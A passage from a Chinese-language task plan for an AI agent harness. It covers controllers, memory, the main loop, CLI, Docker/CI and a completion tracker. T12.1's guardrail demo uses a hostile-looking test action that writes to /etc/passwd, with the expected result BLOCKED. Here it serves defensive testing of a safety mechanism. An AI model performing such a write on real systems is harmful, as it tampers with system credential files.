  4. RETRY + FEEDBACK_RESOLVED → CONTINUE（计数器重置）
  5. RETRY + RETRY_THRESHOLD → REPLAN（3 次相同 fingerprint）
  6. REPLAN + SAME_ERROR → UPGRADE
  7. 状态转换表以数据结构定义（验证无 if-else 链）
- **依赖：** T1.1, T8.4

---

#### T8.7: GovernanceController

- **目标：** 实现治理控制器——表驱动状态机（SPEC §3.6.4）
- **涉及文件：**
  - `harness/feedback/controllers/governance.py` — `GovernanceController`，表驱动 SM
  - `tests/test_governance_controller.py`
- **实现要点：**
  - 5 个状态：IDLE、BLOCK、ASK_HUMAN、FORCE_STOP、AUDIT
  - 6 条转换规则，以表格形式定义
  - 不执行审批交互——仅产生 ApprovalRequest
  - 接收来自 CoordinationLayer 的升级事件
- **验证步骤：**
  1. IDLE + GUARD_BLOCKED → BLOCK（TDD：先红）
  2. IDLE + GUARD_FLAGGED → ASK_HUMAN（产生 ApprovalRequest）
  3. ASK_HUMAN + APPROVED → IDLE（通过 CoordinationLayer 恢复）
  4. ASK_HUMAN + REJECTED → IDLE（通过 CoordinationLayer 重新规划）
  5. IDLE + CONVERGENCE_FAILURE → FORCE_STOP
  6. IDLE + PRIVILEGE_ESCALATION → ASK_HUMAN
  7. 状态转换表以数据结构定义
- **依赖：** T1.1

---

#### T8.8: CoordinationLayer

- **目标：** 实现协调层——ConvergenceDetector + EscalationManager（SPEC §3.6.5）
- **涉及文件：**
  - `harness/feedback/coordination.py` — `CoordinationLayer` 类
  - `tests/test_coordination_layer.py`
- **实现要点：**
  - ConvergenceDetector：跨迭代追踪 fingerprint 频率，同一 fingerprint 连续 3 次 → 触发升级
  - EscalationManager：3 条升级条件 + 2 条恢复条件
  - 升级：CONVERGENCE_FAILURE、GUARDRAIL_TRIGGER、PRIVILEGE_ESCALATION
  - 恢复：HITL_APPROVED、HITL_REJECTED
  - 纯观察者 + 事件发射器——不持有控制器内部状态，只读取状态并发出事件
- **验证步骤：**
  1. 同一 fingerprint 3 次 → CONVERGENCE_FAILURE 升级（TDD：先红）
  2. Recovery 中 LLM 触发危险动作 → GUARDRAIL_TRIGGER 升级
  3. Recovery 需要超出权限操作 → PRIVILEGE_ESCALATION 升级
  4. HITL_APPROVED → 恢复到 Recovery
  5. HITL_REJECTED → 恢复到 Recovery（REPLAN）
  6. CoordinationLayer 不持有控制器内部状态
- **依赖：** T1.1, T8.4, T8.6, T8.7

---

#### T8.9: FeedbackPipeline (集成)

- **目标：** 将 4 层集成为统一的 FeedbackPipeline 入口（SPEC §3.6）
- **涉及文件：**
  - `harness/feedback/pipeline.py` — `FeedbackPipeline` 类，`process(execution_outcome) → PipelineResult`
  - `tests/test_feedback_pipeline.py`
- **实现要点：**
  - 协调 4 层的调用顺序：Generator → FingerprintStrategy → Router → Controller → CoordinationLayer
  - 返回 PipelineResult：包含恢复决策、治理决策、升级事件、修改后的上下文
  - 不持有状态——Pipeline 是无状态的，状态由 Controllers 和 CoordinationLayer 持有
- **验证步骤：**
  1. Shell 失败 → 完整管道处理，RecoveryController 返回 CONTINUE（TDD：先红）
  2. Guardrail BLOCKED → 完整管道处理，GovernanceController 返回 BLOCK
  3. 连续 3 次相同错误 → 收敛检测触发升级
  4. 端到端：ToolResult → Feedback → Router → Controller → PipelineResult
- **依赖：** T1.1, T8.1–T8.8

---

### Phase 9: Memory Manager

---

#### T9.1: MemoryStore

- **目标：** 实现基于文件的记忆存储（SPEC §3.7）
- **涉及文件：**
  - `harness/memory/__init__.py`
  - `harness/memory/store.py` — `MemoryStore`，`read_all() → list[MemoryEntry]`、`write(entries)`、`append(entry)`
  - `tests/test_memory_store.py`
- **实现要点：**
  - 纯文件 I/O：读写 JSON 文件
  - 不解释内容——只读取和写入
  - 损坏文件：记录警告，返回空列表
  - 写入失败：记录错误，不阻止继续执行
- **验证步骤：**
  1. 写入条目 → 读取返回相同条目（TDD：先红）
  2. 追加条目 → 读取返回所有条目
  3. 空文件 → 读取返回空列表
  4. 损坏 JSON → 警告 + 空列表（非致命）
  5. 写入权限拒绝 → 错误日志 + 不崩溃
- **依赖：** T1.1

---

#### T9.2: MemoryRetriever

- **目标：** 实现记忆检索器——全量注入（SPEC §3.7）
- **涉及文件：**
  - `harness/memory/retriever.py` — `MemoryRetriever`，`retrieve(task) → list[MemoryEntry]`
  - `tests/test_memory_retriever.py`
- **实现要点：**
  - 当前实现：加载全部条目（小规模记忆的全量注入）
  - 接受 MemoryStore 和当前任务字符串
  - 可替换设计（接口预留，未来可切换为基于关键词/嵌入的检索）
- **验证步骤：**
  1. 有 3 条记忆 → 检索返回全部 3 条（TDD：先红）
  2. 空记忆存储 → 检索返回空列表
  3. 任务字符串不影响当前实现（全量注入）
- **依赖：** T1.1, T9.1
- **可并行：** 否——必须在 T9.1 完成后串行执行

---

#### T9.3: MemoryPolicy

- **目标：** 实现确定性记忆持久化策略（SPEC §3.7）
- **涉及文件：**
  - `harness/memory/policy.py` — `MemoryPolicy`，`evaluate(feedback) → PersistDecision`
  - `tests/test_memory_policy.py`
- **实现要点：**
  - 确定性规则——非 LLM 判断
  - 规则示例：`source=USER_INPUT → PERSIST`、`source=SHELL → DISCARD`、`source=TEST → DISCARD`
  - 与 Serializer 分离：Policy 决定"是否持久化"，Serializer 决定"持久化什么"
- **验证步骤：**
  1. USER_INPUT 反馈 → PERSIST（TDD：先红）
  2. SHELL 反馈 → DISCARD
  3. TEST 反馈 → DISCARD
  4. 所有规则是确定性的（相同输入 → 相同输出）
- **依赖：** T1.1

---

#### T9.4: Serializer

- **目标：** 实现记忆序列化器——JSON MVP（SPEC §3.7）
- **涉及文件：**
  - `harness/memory/serializer.py` — `Serializer`，`serialize(feedback, persist_decision) → MemoryEntry`
  - `tests/test_serializer.py`
- **实现要点：**
  - MVP：结构化 JSON 序列化器
  - LLM 摘要为预留扩展点
  - 从 Feedback 和 PersistDecision 提取数据生成 MemoryEntry
- **验证步骤：**
  1. PERSIST + Feedback → 含正确 category 的 MemoryEntry（TDD：先红）
  2. DISCARD → 不产生 MemoryEntry
  3. MemoryEntry 包含时间戳和 source_round
- **依赖：** T1.1

---

### Phase 10: Main Loop

---

#### T10.1: Main Loop 状态机

- **目标：** 实现事件驱动的 Main Loop 状态机（SPEC §3.1）
- **涉及文件：**
  - `harness/loop/__init__.py`
  - `harness/loop/main_loop.py` — `MainLoop` 类，`run(task) → TerminalState`
  - `tests/test_main_loop.py`
- **实现要点：**
  - 6 个状态：START、RUNNING、AWAITING_HUMAN、COMPLETED、FAILED、CANCELLED
  - 8 条状态转换（表驱动）
  - 编排所有模块：ContextBuilder → LLM → ActionParser → Guardrail → ToolExecutor → FeedbackPipeline → StopConditions
  - 迭代计数器 + 超时计时器
  - AWAITING_HUMAN 超时独立追踪
  - 未处理异常：捕获、记录 → FAILED
  - 消息历史由 Main Loop 持有并传入 ContextBuilder
- **验证步骤（使用 MockAdapter）：**
  1. 正常流程：任务 → LLM 返回 task_complete → COMPLETED（TDD：先红）
  2. 迭代限制：Mock 始终返回 TextOnly → 10 次迭代后 FAILED
  3. 超时：Mock 延迟 → timeout_seconds 后 FAILED
  4. HITL 流程：触发 APPROVAL_REQUIRED → AWAITING_HUMAN → approved → RUNNING
  5. HITL 拒绝：AWAITING_HUMAN → rejected → CANCELLED
  6. HITL 超时：AWAITING_HUMAN → timeout → FAILED
  7. 收敛失败：Mock 3 次相同错误 → FAILED
  8. 所有状态转换记录日志
- **依赖：** T1.1, T2.1, T3.2, T4.3, T5.1, T6.1, T7.4, T8.9, T9.1–T9.4

---

### Phase 11: CLI Entry Point

---

#### T11.1: CLI Entry Point

- **目标：** 实现命令行入口（SPEC §7.1.2, §8.5）
- **涉及文件：**
  - `harness/cli/__init__.py`
  - `harness/cli/main.py` — `main()` 函数，argparse CLI
- **实现要点：**
  - 子命令：`run`（执行任务）、`--setup`（配置凭据）、`--clear-credentials`（清除凭据）
  - `run` 接受 `--task` 参数（任务字符串）
  - `run` 接受 `--config` 参数（配置文件路径，默认 `./config.toml`）
  - 启动流程：加载 Config → 初始化 CredentialManager → 初始化其他模块 → 运行 MainLoop
  - 退出码：COMPLETED → 0，FAILED → 1，CANCELLED → 2
- **验证步骤：**
  1. `ai4se-harness --setup` → 提示输入 API Key
  2. `ai4se-harness run --task "echo hello"` → 使用 MockAdapter 运行
  3. `ai4se-harness --clear-credentials` → 清除凭据
  4. 缺失 `--task` → 错误消息
  5. 缺失 `config.toml` → 错误消息
- **依赖：** T10.1, T2.2
- **测试覆盖：** 由 `tests/test_cli.py` 覆盖 CLI 参数解析与退出码；端到端流程由 `tests/test_main_loop.py` 覆盖

---

### Phase 12: Integration & Mechanism Demo

---

#### T12.1: Mechanism Demo

- **目标：** 实现三项机制演示（SPEC §9.10, §A.6）
- **涉及文件：**
  - `tests/test_mechanism_demo.py` — 三项演示
- **实现要点：**
  - Demo 1（Guardrail 阻止危险动作）：构造 Action(write_file, path="/etc/passwd") → Guardrail → BLOCKED
  - Demo 2（反馈闭环）：MockAdapter 返回 write_file → Mock 返回 execute_shell(pytest) → ToolResult(exit_code=1) → Feedback Pipeline → RecoveryController → LLM 收到反馈 → 下次调用返回修复代码的 write_file
  - Demo 3（深度维度：收敛检测升级）：MockAdapter 连续 3 次返回相同错误动作 → CoordinationLayer 检测收敛失败 → GovernanceController.FORCE_STOP
- **验证步骤：**
  1. Demo 1：`guardrail.evaluate(dangerous_action).verdict == BLOCKED`（确定性）
  2. Demo 2：Feedback Pipeline 产生 Feedback → LLM 下一步动作改变（确定性，使用 MockAdapter）
  3. Demo 3：3 次相同 fingerprint → ConvergenceDetector 触发升级 → MainLoop → FAILED（确定性）
  4. 三项演示均无网络请求，使用 MockAdapter
- **依赖：** T10.1, T7.4, T8.9

---

### Phase 13: Docker & CI/CD

---

#### T13.1: Dockerfile

- **目标：** 创建多阶段 Docker 构建（SPEC §7.2.2）
- **涉及文件：**
  - `Dockerfile`
- **实现要点：**
  - 基于 `python:3.11-slim`
  - 安装依赖 + 项目
  - 入口点：`ai4se-harness`
  - 卷挂载用于凭据持久化
- **验证步骤：**
  1. `docker build -t ai4se-harness .` 成功
  2. `docker run ai4se-harness --help` 输出帮助信息
- **依赖：** T11.1

---

#### T13.2: CI/CD (GitHub Actions)

- **目标：** 配置 GitHub Actions 自动运行测试（SPEC §9.11）
- **涉及文件：**
  - `.github/workflows/unit-test.yml`
- **实现要点：**
  - 触发条件：push 到任意分支
  - Job：`unit-test`
  - 步骤：checkout → setup Python 3.11 → install deps → run `make test`
  - 测试使用 MockAdapter，无网络请求
- **验证步骤：**
  1. Push → GitHub Actions 触发
  2. `unit-test` job 通过（绿色）
  3. 所有测试使用 MockAdapter（无真实 LLM 调用）
- **依赖：** T12.1

---

#### T13.3: README.md

- **目标：** 编写完整的 README 文档（通用要求 §五.4）
- **涉及文件：**
  - `README.md`
- **内容要求：**
  - 项目简介
  - 安装命令（`pip install .` 或 Docker）
  - 运行命令（`ai4se-harness run --task "..."`）
  - 分发命令（Docker build/run）
  - Key 在目标机器上的安全配置方式
  - 目录结构说明
  - 安全边界说明
  - 已知限制（平台/架构/依赖前提）
- **依赖：** T13.1, T13.2

---

## 依赖关系汇总

| Task | 依赖 | 可并行 |
|------|------|--------|
| T0.1 | — | 否 |
| T1.1 | T0.1 | 否 |
| T2.1 | T1.1 | ∥ T2.2 |
| T2.2 | T1.1 | ∥ T2.1 |
| T3.1 | T1.1, T2.1 | ∥ T4.1, T4.2 |
| T3.2 | T1.1, T3.1 | 否（串行于 T3.1 之后） |
| T4.1 | T1.1 | ∥ T3.1, T4.2 |
| T4.2 | T1.1 | ∥ T3.1, T4.1 |
| T4.3 | T1.1, T4.1, T4.2 | 否 |
| T5.1 | T1.1, T4.1 | 否 |
| T6.1 | T1.1, T4.1 | 否 |
| T7.1 | T1.1 | ∥ T7.3 |
| T7.2 | T1.1, T7.1 | 否 |
| T7.3 | T1.1 | ∥ T7.1 |
| T7.4 | T1.1, T7.2, T7.3 | 否 |
| T8.1 | T1.1 | ∥ T8.2, T8.3, T8.4, T8.5 |
| T8.2 | T1.1, T8.1 | ∥ T8.1, T8.3, T8.4, T8.5 |
| T8.3 | T1.1, T8.1 | ∥ T8.1, T8.2, T8.4, T8.5 |
| T8.4 | T1.1 | ∥ T8.1, T8.2, T8.3, T8.5 |
| T8.5 | T1.1 | ∥ T8.1, T8.2, T8.3, T8.4 |
| T8.6 | T1.1, T8.4 | ∥ T8.7 |
| T8.7 | T1.1 | ∥ T8.6 |
| T8.8 | T1.1, T8.4, T8.6, T8.7 | 否 |
| T8.9 | T1.1, T8.1–T8.8 | 否 |
| T9.1 | T1.1 | ∥ T9.3, T9.4 |
| T9.2 | T1.1, T9.1 | 否（串行于 T9.1 之后） |
| T9.3 | T1.1 | ∥ T9.1, T9.4 |
| T9.4 | T1.1 | ∥ T9.1, T9.3 |
| T10.1 | 全部 Phase 2–9 | 否 |
| T11.1 | T10.1, T2.2 | 否 |
| T12.1 | T10.1, T7.4, T8.9 | 否 |
| T13.1 | T11.1 | ∥ T13.2 |
| T13.2 | T12.1 | ∥ T13.1 |
| T13.3 | T13.1, T13.2 | 否 |

---

## 完成追踪

| Task | 状态 | Commit Hash | Subagent | 人工修改 |
|------|------|-------------|----------|----------|
| T0.1 | ✅ | — | Claude Code | — |
| T1.1 | ✅ | — | Claude Code | — |
| **M1** | ✅ | — | Claude Code | Data Contract Frozen — 全部 16 个 dataclass + 6 个 Enum 通过 SPEC §6 逐项验证 |
| T2.1 | ✅ | — | Claude Code | — |
| T2.2 | ✅ | — | Claude Code | — |
| T3.1 | ⬜ | — | — | — |
| T3.2 | ⬜ | — | — | — |
| T4.1 | ⬜ | — | — | — |
| T4.2 | ⬜ | — | — | — |
| T4.3 | ⬜ | — | — | — |
| T5.1 | ⬜ | — | — | — |
| T6.1 | ⬜ | — | — | — |
| T7.1 | ⬜ | — | — | — |
| T7.2 | ⬜ | — | — | — |
| T7.3 | ⬜ | — | — | — |
| T7.4 | ⬜ | — | — | — |
| T8.1 | ⬜ | — | — | — |
| T8.2 | ⬜ | — | — | — |
| T8.3 | ⬜ | — | — | — |
| T8.4 | ⬜ | — | — | — |
| T8.5 | ⬜ | — | — | — |
| T8.6 | ⬜ | — | — | — |
| T8.7 | ⬜ | — | — | — |
| T8.8 | ⬜ | — | — | — |
| T8.9 | ⬜ | — | — | — |
| T9.1 | ⬜ | — | — | — |
| T9.2 | ⬜ | — | — | — |
| T9.3 | ⬜ | — | — | — |
| T9.4 | ⬜ | — | — | — |
| T10.1 | ⬜ | — | — | — |
| T11.1 | ⬜ | — | — | — |
| T12.1 | ⬜ | — | — | — |
| T13.1 | ⬜ | — | — | — |
| T13.2 | ⬜ | — | — | — |
| T13.3 | ⬜ | — | — | — |

> 状态：⬜ Pending | 🔄 In Progress | ✅ Complete | ❌ Blocked